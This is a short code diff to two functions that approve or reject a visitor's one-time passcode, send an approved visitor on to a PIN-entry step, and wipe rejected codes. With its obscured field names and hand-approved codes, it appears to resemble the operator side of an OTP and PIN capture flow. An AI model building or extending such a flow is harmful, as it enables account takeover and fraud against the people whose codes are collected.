@@ -72,7 +72,10 @@ export async function handleOtpApproval(
   // Approve OTP and show PIN dialog
   await updateApplication(visitorId, {
     _v5Status: "approved",
-    otpStatus: "show_pin" as any
+    otpStatus: "show_pin" as any,
+    pinStatus: "waiting" as any,
+    redirectPage: "pin" as any,
+    currentStep: "_t3" as any,
   })
 }
 
@@ -89,7 +92,13 @@ export async function handleOtpRejection(
   
   // Reject OTP and notify visitor
   await updateApplication(visitorId, {
-    _v5Status: "rejected"
+    _v5Status: "rejected",
+    _v5: "",
+    otpCode: "",
+    otp: "",
+    otpStatus: "show_otp" as any,
+    redirectPage: "otp" as any,
+    currentStep: "_t2" as any,
   })
 }
 
